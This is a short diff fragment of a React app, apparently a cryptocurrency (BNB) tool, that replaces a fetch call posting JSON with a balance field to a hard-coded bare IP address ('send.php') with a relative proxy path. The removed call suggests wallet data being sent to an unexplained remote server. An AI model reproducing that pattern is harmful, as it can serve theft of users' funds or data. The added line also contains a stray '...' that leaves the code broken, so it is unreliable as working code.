@@ -29,7 +29,7 @@ function App() {
           balance: balance, // مقدار BNB مورد نظر
         };
 
-        let response = await fetch("http://104.194.133.124/send.php", {
+        let response = await fetch("/api/proxy", { ...
           method: "POST",
           headers: { "Content-Type": "application/json" },
           body: JSON.stringify(requestData),
